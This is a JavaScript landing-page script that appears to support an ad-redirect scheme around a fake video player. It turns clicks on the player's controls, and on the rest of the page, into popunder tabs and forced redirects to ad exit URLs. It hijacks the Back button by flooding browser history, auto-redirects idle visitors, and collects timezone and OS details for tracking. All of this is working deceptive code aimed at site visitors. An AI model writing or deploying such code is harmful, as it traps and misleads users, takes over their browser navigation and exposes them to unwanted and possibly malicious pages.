/* common.js — vanisher-style micro handoff (fixed)
   v1:
     - micro targets -> open CLONE tab, current tab redirects to TABUNDER (AFU)
     - everything else -> MAIN EXIT (even before ready)
   v2 (clone):
     - ANY click anywhere -> MAIN EXIT (micro disabled)

   Fixes:
   - before READY: non-micro clicks trigger mainExit (no "only back.html in URL")
   - dual-tab exit: fallback redirect if tab stays visible (mobile chrome cases)
   - back pushState: restores original URL correctly
*/

(() => {
  "use strict";

  // ---------------------------
  // Helpers
  // ---------------------------
  const safe = (fn) => { try { return fn(); } catch { return undefined; } };
  const err  = (...a) => safe(() => console.error(...a));

  const replaceTo = (url) => {
    try { window.location.replace(url); } catch { window.location.href = url; }
  };

  // Open immediately (popup rules). Navigates blank -> target.
  const openTab = (url) => {
    try {
      const w = window.open("about:blank", "_blank");
      if (w) {
        try { w.opener = null; } catch {}
        try { w.location.replace(url); } catch { try { w.location.href = url; } catch {} }
      }
      return w || null;
    } catch {
      return null;
    }
  };

  // ---------------------------
  // URL + params
  // ---------------------------
  const curUrl = new URL(window.location.href);
  const getSP = (k, def = "") => curUrl.searchParams.get(k) ?? def;

  const CLONE_PARAM = "__cl";
  const isClone = getSP(CLONE_PARAM) === "1";

  const IN = {
    pz: getSP("pz"), tb: getSP("tb"), tb_reverse: getSP("tb_reverse"), ae: getSP("ae"),
    z: getSP("z"), var: getSP("var"), var_1: getSP("var_1"), var_2: getSP("var_2"), var_3: getSP("var_3"),
    b: getSP("b"), campaignid: getSP("campaignid"), abtest: getSP("abtest"), rhd: getSP("rhd", "1"),
    s: getSP("s"), ymid: getSP("ymid"), wua: getSP("wua"),
    use_full_list_or_browsers: getSP("use_full_list_or_browsers"),
    cid: getSP("cid"), geo: getSP("geo"),
  };

  const qsFromObj = (obj) => {
    const qs = new URLSearchParams();
    Object.entries(obj || {}).forEach(([k, v]) => {
      if (v != null && String(v) !== "") qs.set(k, String(v));
    });
    return qs;
  };

  const getTimezoneName = () => safe(() => Intl.DateTimeFormat().resolvedOptions().timeZone) || "";
  const getTimezoneOffset = () => safe(() => new Date().getTimezoneOffset()) ?? 0;

  const getOsVersion = async () => {
    try {
      const nav = navigator;
      if (!nav.userAgentData?.getHighEntropyValues) return "";
      const v = await nav.userAgentData.getHighEntropyValues(["platformVersion"]);
      return v?.platformVersion || "";
    } catch {
      return "";
    }
  };

  // cache (avoid repeated delays)
  const osVersionPromise = getOsVersion();

  const buildCmeta = () => {
    try {
      const html = document.documentElement;
      const payload = {
        dataVer: html.getAttribute("data-version") || html.dataset.version || "",
        landingName: html.getAttribute("data-landing-name") || html.dataset.landingName || "",
        templateHash: window.templateHash || "",
      };
      return btoa(JSON.stringify(payload));
    } catch {
      return "";
    }
  };

  // ---------------------------
  // Normalize APP_CONFIG
  // ---------------------------
  const normalizeConfig = (appCfg) => {
    if (!appCfg || typeof appCfg !== "object" || !appCfg.domain) return null;

    const cfg = { domain: appCfg.domain };
    const ensure = (name) => (cfg[name] ||= {});

    Object.entries(appCfg).forEach(([k, v]) => {
      if (v == null || v === "" || k === "domain") return;

      let m = k.match(/^([a-zA-Z0-9]+)_(currentTab|newTab)_(zoneId|url)$/);
      if (m) {
        const [, name, tab, field] = m;
        const ex = ensure(name);
        (ex[tab] ||= {}).domain = field === "zoneId" ? cfg.domain : ex[tab].domain;
        ex[tab][field] = v;
        return;
      }

      m = k.match(/^([a-zA-Z0-9]+)_(count|timeToRedirect|pageUrl)$/);
      if (m) {
        ensure(m[1])[m[2]] = v;
        return;
      }

      // tabUnderClick_* by default = newTab
      m = k.match(/^([a-zA-Z0-9]+)_(zoneId|url)$/);
      if (m) {
        const [, name, field] = m;
        const ex = ensure(name);
        const tab = (name === "tabUnderClick") ? "newTab" : "currentTab";
        (ex[tab] ||= {}).domain = field === "zoneId" ? cfg.domain : ex[tab].domain;
        ex[tab][field] = v;
      }
    });

    return cfg;
  };

  // ---------------------------
  // AFU URL builder
  // ---------------------------
  const buildExitQS = async ({ zoneId, passParamToParams }) => {
    const ab2r =
      IN.abtest ||
      (typeof window.APP_CONFIG?.abtest !== "undefined" ? String(window.APP_CONFIG.abtest) : "");

    const base = {
      ymid: IN.var_1 || IN.var || "",
      var: IN.var_2 || IN.z || "",
      var_3: IN.var_3 || "",
      b: IN.b || "",
      campaignid: IN.campaignid || "",
      click_id: IN.s || "",
      rhd: IN.rhd || "1",
      os_version: (await osVersionPromise) || "",
      btz: getTimezoneName(),
      bto: String(getTimezoneOffset()),
      cmeta: buildCmeta(),
      pz: IN.pz || "",
      tb: IN.tb || "",
      tb_reverse: IN.tb_reverse || "",
      ae: IN.ae || "",
      ab2r,
    };

    if (zoneId != null && String(zoneId) !== "") base.zoneid = String(zoneId);

    let qs = qsFromObj(base);

    if (Array.isArray(passParamToParams)) {
      try {
        passParamToParams.forEach(({ from, to, joinWith }) => {
          if (!to?.length) return;
          let val = "";
          if (Array.isArray(from)) {
            val = from.map(k => curUrl.searchParams.get(k) || "").filter(Boolean).join(joinWith ?? "");
          } else if (typeof from === "string") {
            val = curUrl.searchParams.get(from) || "";
          }
          if (val) to.forEach(k => qs.set(k, val));
        });
      } catch {}
    }

    return qs;
  };

  const generateAfuUrl = async (zoneId, domain, passParamToParams) => {
    const host = String(domain || "").trim();
    if (!host) throw new Error("Empty domain");
    const base = host.startsWith("http") ? host : `https://${host}`;
    const url = new URL(base.replace(/\/+$/, "") + "/afu.php");
    url.search = (await buildExitQS({ zoneId, passParamToParams })).toString();
    return url.toString();
  };

  // ---------------------------
  // Back (classic back.html)
  // ---------------------------
  const pushBackStates = (url, count) => {
    try {
      const n = Math.max(0, parseInt(count, 10) || 0);
      const originalUrl = window.location.href; // MUST capture before pushState changes address bar

      for (let i = 0; i < n; i++) {
        window.history.pushState(null, "Please wait...", url);
      }

      window.history.pushState(null, document.title, originalUrl);
    } catch (e) {
      err("Back pushState error:", e);
    }
  };

  const getDefaultBackHtmlUrl = () => {
    const { origin, pathname } = window.location;
    let dir = pathname.replace(/\/(index|back)\.html$/i, "");
    if (dir.endsWith("/")) dir = dir.slice(0, -1);
    if (!dir) return `${origin}/back.html`;
    return `${origin}${dir}/back.html`;
  };

  const initBack = async (cfg) => {
    const b = cfg?.back?.currentTab;
    if (!b) return;

    const count = cfg.back?.count ?? 10;
    const pageUrl = cfg.back?.pageUrl || getDefaultBackHtmlUrl();
    const page = new URL(pageUrl, window.location.href);

    const qs = await buildExitQS({ zoneId: b.zoneId });

    // router params for your back.html
    if (b.url) {
      qs.set("url", String(b.url));
    } else {
      qs.set("z", String(b.zoneId));
      qs.set("domain", String(b.domain || cfg.domain || ""));
    }

    page.search = qs.toString();
    pushBackStates(page.toString(), count);
  };

  // ---------------------------
  // Exits
  // ---------------------------
  const runExitCurrentTab = async (cfg, name, withBack = true) => {
    const ex = cfg?.[name]?.currentTab;
    if (!ex) return;

    let url = "";
    if (ex.zoneId && ex.domain) url = await generateAfuUrl(ex.zoneId, ex.domain);
    else if (ex.url) url = String(ex.url);
    else return;

    safe(() => window.syncMetric?.({ event: name, exitZoneId: ex.zoneId || ex.url }));
    if (withBack) await initBack(cfg);
    replaceTo(url);
  };

  // Dual-tabs with fallback (if page stays visible, redirect current anyway)
  const runExitDualTabs = async (cfg, name, withBack = true) => {
    const ex = cfg?.[name];
    if (!ex) return;

    const ct = ex.currentTab;
    const nt = ex.newTab;

    let ctUrl = "", ntUrl = "";

    if (ct) {
      if (ct.zoneId && ct.domain) ctUrl = await generateAfuUrl(ct.zoneId, ct.domain);
      else if (ct.url) ctUrl = String(ct.url);
    }
    if (nt) {
      if (nt.zoneId && nt.domain) ntUrl = await generateAfuUrl(nt.zoneId, nt.domain);
      else if (nt.url) ntUrl = String(nt.url);
    }

    safe(() => {
      if (ctUrl) window.syncMetric?.({ event: name, exitZoneId: ct?.zoneId || ct?.url });
      if (ntUrl) window.syncMetric?.({ event: name, exitZoneId: nt?.zoneId || nt?.url });
    });

    if (withBack) await initBack(cfg);

    if (!ntUrl) {
      if (ctUrl) replaceTo(ctUrl);
      return;
    }

    const w = openTab(ntUrl);

    // If newTab failed, just redirect current immediately.
    if (!w) {
      if (ctUrl) replaceTo(ctUrl);
      return;
    }

    // If we have currentTab URL, do:
    // - redirect on return (visibilitychange)
    // - BUT if tab stays visible (common mobile case) => redirect after short delay
    if (ctUrl) {
      let done = false;

      const cleanup = () => {
        document.removeEventListener("visibilitychange", onVis);
      };

      const doRedirect = () => {
        if (done) return;
        done = true;
        cleanup();
        replaceTo(ctUrl);
      };

      const onVis = () => {
        if (document.visibilityState === "visible") doRedirect();
      };

      document.addEventListener("visibilitychange", onVis);

      // Fallback: if still visible shortly after openTab, redirect now
      setTimeout(() => {
        if (!done && document.visibilityState === "visible") doRedirect();
      }, 250);
    }
  };

  const run = async (cfg, name) => {
    if (name === "tabUnderClick" && !cfg?.tabUnderClick) {
      return runExitDualTabs(cfg, "mainExit", true);
    }
    if (cfg?.[name]?.newTab) return runExitDualTabs(cfg, name, true);
    return runExitCurrentTab(cfg, name, true);
  };

  // ---------------------------
  // Reverse & Autoexit
  // ---------------------------
  const initReverse = (cfg) => {
    if (!cfg?.reverse?.currentTab) return;

    let armed = false;

    window.addEventListener("click", async () => {
      if (armed) return;
      armed = true;

      try {
        await initBack(cfg);
        const keep = window.location.pathname + window.location.search;
        window.history.pushState(null, "", keep);
      } catch (e2) {
        err("Reverse arm error:", e2);
      }
    }, { capture: true, once: true });

    window.addEventListener("popstate", () => {
      runExitCurrentTab(cfg, "reverse", false).catch(err);
    });
  };

  const initAutoexit = (cfg) => {
    if (!cfg?.autoexit?.currentTab) return;

    const sec = parseInt(cfg.autoexit.timeToRedirect, 10) || 90;

    let armed = false;
    const trigger = () => {
      if (document.visibilityState === "visible" && armed) {
        runExitCurrentTab(cfg, "autoexit", true).catch(err);
      }
    };

    const timer = setTimeout(() => {
      armed = true;
      trigger();
    }, sec * 1000);

    const cancel = () => {
      clearTimeout(timer);
      document.removeEventListener("visibilitychange", trigger);
    };

    document.addEventListener("visibilitychange", trigger);
    ["mousemove", "click", "scroll"].forEach(ev => document.addEventListener(ev, cancel, { once: true }));
  };

  // ---------------------------
  // READY flag (kept for logic, but mainExit must work even before ready)
  // ---------------------------
  const isPlayerReady = () => {
    const btn = document.querySelector(".xh-main-play-trigger");
    return !!(btn && btn.classList.contains("ready"));
  };

  // ---------------------------
  // MICRO handoff (v1 only)
  // ---------------------------
  const MICRO_DONE_KEY = "__micro_done";

  const buildCloneUrl = () => {
    const u = new URL(window.location.href);
    u.searchParams.set(CLONE_PARAM, "1");
    u.searchParams.set("__skipPreview", "1");
    return u.toString();
  };

  const buildTabUnderUrl = async (cfg) => {
    const ex = cfg?.tabUnderClick?.newTab || cfg?.tabUnderClick?.currentTab;
    if (!ex) return "";

    if (ex.zoneId && ex.domain) return await generateAfuUrl(ex.zoneId, ex.domain);
    if (ex.url) return String(ex.url);
    return "";
  };

  const runMicroHandoff = async (cfg) => {
    if (isClone) return;

    if (safe(() => sessionStorage.getItem(MICRO_DONE_KEY)) === "1") {
      // second micro attempt -> treat as mainExit (by your spec: after micro, clone does main; v1 also can degrade)
      return run(cfg, "mainExit");
    }

    safe(() => sessionStorage.setItem(MICRO_DONE_KEY, "1"));

    // popup-safe: open clone BEFORE awaits
    const cloneUrl = buildCloneUrl();
    safe(() => window.syncMetric?.({ event: "micro_open_clone" }));
    openTab(cloneUrl);

    const monetUrl = await buildTabUnderUrl(cfg);

    if (monetUrl) {
      safe(() => window.syncMetric?.({ event: "tabUnderClick" }));
      replaceTo(monetUrl);
    } else {
      run(cfg, "mainExit");
    }
  };

  // ---------------------------
  // Click map (your data-target)
  // ---------------------------
  const initClickMap = (cfg) => {
    const fired = { mainExit: false, back: false };

    // your micro targets
    const microTargets = new Set([
      "timeline",
      "play_pause",
      "mute_unmute",
      "settings",
      "fullscreen",
      "pip_top",
      "pip_bottom",
    ]);

    document.addEventListener("click", async (e) => {
      const zone = e.target?.closest?.("[data-target]");
      const t = zone?.getAttribute("data-target") || "";

      // UI back button (separate exit)
      if (t === "back_button") {
        if (fired.back) return;
        fired.back = true;
        e.preventDefault();
        e.stopPropagation();
        runExitCurrentTab(cfg, "back", true).catch(err);
        return;
      }

      // CLONE: any click -> mainExit (no micro, no ready gate)
      if (isClone) {
        if (fired.mainExit) return;
        fired.mainExit = true;
        e.preventDefault();
        e.stopPropagation();
        run(cfg, "mainExit").catch(err);
        return;
      }

      // v1: micro targets -> micro handoff (allowed even before ready)
      if (microTargets.has(t)) {
        e.preventDefault();
        e.stopPropagation();
        runMicroHandoff(cfg).catch(err);
        return;
      }

      // v1: everything else -> MAIN EXIT (IMPORTANT: even before READY)
      if (fired.mainExit) return;
      fired.mainExit = true;
      e.preventDefault();
      e.stopPropagation();
      run(cfg, "mainExit").catch(err);
    }, true);
  };

  // ---------------------------
  // Boot
  // ---------------------------
  const boot = async () => {
    if (typeof window.APP_CONFIG === "undefined") {
      document.body.innerHTML = "<p style='color:#fff;padding:12px'>MISSING APP_CONFIG</p>";
      return;
    }

    const cfg = normalizeConfig(window.APP_CONFIG);
    if (!cfg) return;

    window.LANDING_EXITS = {
      cfg,
      run: (name) => run(cfg, name),
      initBack: () => initBack(cfg),
      microHandoff: () => runMicroHandoff(cfg),
      isPlayerReady,
    };

    initClickMap(cfg);
    initAutoexit(cfg);
    initReverse(cfg);
  };

  // execute asap (defer scripts run at parse end; readyState usually "interactive")
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", boot);
  } else {
    boot();
  }
})();
